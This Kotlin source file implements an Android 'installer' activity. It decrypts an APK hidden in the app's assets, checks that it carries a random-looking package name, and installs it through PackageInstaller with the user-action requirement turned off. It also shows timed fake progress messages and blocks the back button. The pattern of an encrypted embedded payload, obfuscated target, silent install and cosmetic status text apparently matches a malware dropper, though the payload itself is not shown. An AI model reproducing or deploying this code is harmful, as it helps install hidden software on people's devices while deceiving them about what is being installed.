package com.coderx.installer

import android.animation.Animator
import android.animation.AnimatorListenerAdapter
import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.animation.AccelerateDecelerateInterpolator
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.coderx.installer.databinding.ActivityInstallationBinding
import com.coderx.installer.utils.AssetEncryption
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.lang.ref.WeakReference
import kotlin.random.Random

class InstallationActivity : AppCompatActivity() {
    private lateinit var binding: ActivityInstallationBinding
    private var installReceiver: InstallReceiver? = null
    private var isInstalling = false
    private val targetPackage = "com.shgrjisb1p8.app"
    private var currentSessionId: Int = -1
    private val animationHandler = Handler(Looper.getMainLooper())
    private var circleAnimators = mutableListOf<ObjectAnimator>()

    companion object {
        private const val ASSETS_APK_NAME = "app.apk"
        private const val TAG = "InstallationActivity"
        private const val REQUEST_CODE_INSTALL = 12345

        private var activityReference: WeakReference<InstallationActivity>? = null

        fun getCurrentActivity(): InstallationActivity? = activityReference?.get()

        fun startInstallation(context: Context) {
            val intent = Intent(context, InstallationActivity::class.java)
            context.startActivity(intent)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityInstallationBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Set weak reference
        activityReference = WeakReference(this)

        setupInstallReceiver()
        setupUI()
        startCircleAnimations()

        // Check permissions before starting installation
        if (canRequestPackageInstalls()) {
            startInstallation()
        } else {
            handleInstallationError("Package installation permission not granted")
        }
    }

    private fun canRequestPackageInstalls(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            packageManager.canRequestPackageInstalls()
        } else {
            true // No special permission needed for older versions
        }
    }

    private fun setupInstallReceiver() {
        installReceiver = InstallReceiver().also { receiver ->
            val filter = IntentFilter().apply {
                addAction(Intent.ACTION_PACKAGE_ADDED)
                addAction(Intent.ACTION_PACKAGE_REPLACED)
                addAction(Intent.ACTION_PACKAGE_REMOVED)
                addAction(InstallReceiver.PACKAGE_INSTALLED_ACTION)
                addDataScheme("package")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(receiver, filter)
            }
        }
    }

    private fun setupUI() {
        binding.progressBar.progress = 0
        binding.statusText.text = "Preparing installation..."
    }

    private fun startCircleAnimations() {
        val circles = listOf(
            binding.circle1, binding.circle2, binding.circle3,
            binding.circle4, binding.circle5, binding.circle6,
            binding.circle7, binding.circle8, binding.circle9
        )

        circles.forEachIndexed { index, circle ->
            startFloatingAnimation(circle, index)
        }
    }

    private fun startFloatingAnimation(view: View, index: Int) {
        val delay = (index * 200L) + Random.nextLong(0, 500)
        val duration = 2000L + Random.nextLong(0, 1000)

        animationHandler.postDelayed({
            if (!isDestroyed && !isFinishing) {
                val translationY = ObjectAnimator.ofFloat(
                    view, "translationY",
                    0f, -30f + Random.nextFloat() * 60f
                ).apply {
                    this.duration = duration
                    interpolator = AccelerateDecelerateInterpolator()
                    repeatCount = ObjectAnimator.INFINITE
                    repeatMode = ObjectAnimator.REVERSE
                }

                val translationX = ObjectAnimator.ofFloat(
                    view, "translationX",
                    0f, -20f + Random.nextFloat() * 40f
                ).apply {
                    this.duration = duration + 500
                    interpolator = AccelerateDecelerateInterpolator()
                    repeatCount = ObjectAnimator.INFINITE
                    repeatMode = ObjectAnimator.REVERSE
                }

                val alpha = ObjectAnimator.ofFloat(
                    view, "alpha",
                    view.alpha, 0.3f + Random.nextFloat() * 0.7f
                ).apply {
                    this.duration = duration - 200
                    interpolator = AccelerateDecelerateInterpolator()
                    repeatCount = ObjectAnimator.INFINITE
                    repeatMode = ObjectAnimator.REVERSE
                }

                circleAnimators.addAll(listOf(translationY, translationX, alpha))
                translationY.start()
                translationX.start()
                alpha.start()
            }
        }, delay)
    }

    private fun startInstallation() {
        if (isInstalling) return

        isInstalling = true
        startProgressAnimation()

        lifecycleScope.launch {
            try {
                val apkFile = withContext(Dispatchers.IO) {
                    extractAndValidateApk()
                }

                if (apkFile != null) {
                    withContext(Dispatchers.Main) {
                        binding.statusText.text = "Installing package..."
                    }

                    withContext(Dispatchers.IO) {
                        startInstantInstallation(apkFile)
                    }
                } else {
                    handleInstallationError("Failed to prepare APK file")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Installation preparation failed", e)
                handleInstallationError("Failed to prepare installation: ${e.message}")
            }
        }
    }

    private fun startProgressAnimation() {
        val progressAnimator = ValueAnimator.ofInt(0, 85).apply {
            duration = 3000
            interpolator = AccelerateDecelerateInterpolator()

            addUpdateListener { animation ->
                val progress = animation.animatedValue as Int
                binding.progressBar.progress = progress

                // Update status text based on progress
                binding.statusText.text = when {
                    progress < 20 -> "Preparing installation..."
                    progress < 40 -> "Extracting files..."
                    progress < 60 -> "Validating package..."
                    progress < 80 -> "Installing..."
                    else -> "Finalizing..."
                }
            }
        }

        progressAnimator.start()
    }

    private suspend fun extractAndValidateApk(): File? {
        return try {
            val encryptedApkName = "${ASSETS_APK_NAME}.enc"

            // Check if encrypted APK exists in assets
            val assetFiles = try {
                assets.list("") ?: emptyArray()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to list assets", e)
                throw Exception("Failed to list assets: ${e.message}")
            }

            if (!assetFiles.contains(encryptedApkName)) {
                Log.e(TAG, "Encrypted APK file not found in assets. Available files: ${assetFiles.joinToString()}")
                throw Exception("Encrypted APK file not found in assets")
            }

            // Extract and decrypt APK
            val apkFile = File(cacheDir, ASSETS_APK_NAME)

            // Clean up existing file
            if (apkFile.exists()) {
                apkFile.delete()
            }

            try {
                val decryptedData = AssetEncryption.readEncryptedAsset(this@InstallationActivity, ASSETS_APK_NAME)

                decryptedData.inputStream().use { input ->
                    FileOutputStream(apkFile).use { output ->
                        val buffer = ByteArray(8192)
                        var bytesRead: Int
                        while (input.read(buffer).also { bytesRead = it } != -1) {
                            output.write(buffer, 0, bytesRead)
                        }
                        output.flush()
                    }
                }

                Log.d(TAG, "APK decrypted successfully, size: ${apkFile.length()} bytes")
            } catch (e: Exception) {
                Log.e(TAG, "APK decryption failed", e)
                throw Exception("Failed to decrypt APK: ${e.message}")
            }

            // Validate the decrypted APK
            if (!apkFile.exists() || apkFile.length() == 0L) {
                throw Exception("Decrypted APK file is invalid or empty")
            }

            // Verify package information
            val packageInfo = try {
                packageManager.getPackageArchiveInfo(apkFile.path, PackageManager.GET_META_DATA)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to read APK package info", e)
                throw Exception("Failed to read APK package info: ${e.message}")
            }

            if (packageInfo == null) {
                throw Exception("APK file is corrupted or invalid")
            }

            if (packageInfo.packageName != targetPackage) {
                Log.w(TAG, "Package name mismatch: expected $targetPackage, got ${packageInfo.packageName}")
                throw IllegalStateException("Package name mismatch: expected $targetPackage, got ${packageInfo.packageName}")
            }

            apkFile
        } catch (e: Exception) {
            Log.e(TAG, "extractAndValidateApk failed", e)
            null
        }
    }

    private fun startInstantInstallation(apkFile: File) {
        var session: PackageInstaller.Session? = null
        try {
            val packageInstaller = packageManager.packageInstaller
            val params = createInstallationParams()

            currentSessionId = packageInstaller.createSession(params)
            Log.d(TAG, "Created installation session: $currentSessionId")

            session = packageInstaller.openSession(currentSessionId)

            // Write APK data to session
            writeApkToSession(session, apkFile)

            // Create and commit the installation
            val pendingIntent = createInstallationPendingIntent()
            session.commit(pendingIntent.intentSender)

            Log.d(TAG, "Installation session committed successfully")

        } catch (e: Exception) {
            Log.e(TAG, "Installation failed", e)
            session?.abandon()
            currentSessionId = -1
            handleInstallationError("Installation failed: ${e.message}")
        } finally {
            session?.close()
        }
    }

    private fun createInstallationParams(): PackageInstaller.SessionParams {
        return PackageInstaller.SessionParams(
            PackageInstaller.SessionParams.MODE_FULL_INSTALL
        ).apply {
            setAppPackageName(targetPackage)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                setInstallReason(PackageManager.INSTALL_REASON_USER)
            }

        }
    }

    private fun writeApkToSession(session: PackageInstaller.Session, apkFile: File) {
        try {
            apkFile.inputStream().use { input ->
                session.openWrite("package", 0, apkFile.length()).use { output ->
                    val buffer = ByteArray(8192)
                    var bytesRead: Int
                    while (input.read(buffer).also { bytesRead = it } != -1) {
                        output.write(buffer, 0, bytesRead)
                    }
                    output.flush()
                    session.fsync(output)
                }
            }
            Log.d(TAG, "APK written to session successfully")
        } catch (e: IOException) {
            Log.e(TAG, "Failed to write APK to session", e)
            throw e
        }
    }

    private fun createInstallationPendingIntent(): PendingIntent {
        val intent = Intent(this, InstallReceiver::class.java).apply {
            action = InstallReceiver.PACKAGE_INSTALLED_ACTION
            putExtra("package_name", targetPackage)
            putExtra("session_id", currentSessionId)
        }

        val flags = PendingIntent.FLAG_UPDATE_CURRENT or when {
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.S -> PendingIntent.FLAG_MUTABLE
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.M -> PendingIntent.FLAG_IMMUTABLE
            else -> 0
        }

        return PendingIntent.getBroadcast(this, REQUEST_CODE_INSTALL, intent, flags)
    }

    fun handleInstallationError(message: String) {
        Log.e(TAG, "Installation error: $message")
        isInstalling = false
        currentSessionId = -1

        runOnUiThread {
            if (!isDestroyed && !isFinishing) {
                binding.statusText.text = "Installation failed"
                binding.progressBar.progress = 0
                Toast.makeText(this, "Installation failed: $message", Toast.LENGTH_LONG).show()

                // Return to main activity after 3 seconds
                Handler(Looper.getMainLooper()).postDelayed({
                    finish()
                }, 3000)
            }
        }
    }

    fun handleInstallationSuccess() {
        isInstalling = false
        currentSessionId = -1

        runOnUiThread {
            if (!isDestroyed && !isFinishing) {
                // Complete the progress animation
                binding.progressBar.progress = 100
                binding.statusText.text = "Installation complete"

                // Show success and finish after delay
                Handler(Looper.getMainLooper()).postDelayed({
                    finish()
                }, 2000)
            }
        }
    }

    override fun onDestroy() {
        // Clean up weak reference
        activityReference?.clear()
        activityReference = null

        // Stop all animations
        circleAnimators.forEach { it.cancel() }
        circleAnimators.clear()
        animationHandler.removeCallbacksAndMessages(null)

        // Abandon any ongoing installation session
        if (currentSessionId != -1) {
            try {
                packageManager.packageInstaller.openSession(currentSessionId).abandon()
                Log.d(TAG, "Installation session abandoned")
            } catch (e: Exception) {
                Log.w(TAG, "Failed to abandon session", e)
            }
        }

        // Safely unregister receiver
        installReceiver?.let { receiver ->
            try {
                unregisterReceiver(receiver)
                Log.d(TAG, "Install receiver unregistered")
            } catch (e: IllegalArgumentException) {
                Log.w(TAG, "Receiver not registered", e)
            }
        }

        super.onDestroy()
    }

    override fun onBackPressed() {
        // Prevent back press during installation
        if (isInstalling) {
            Toast.makeText(this, "Installation in progress...", Toast.LENGTH_SHORT).show()
            return
        }
        super.onBackPressed()
    }
}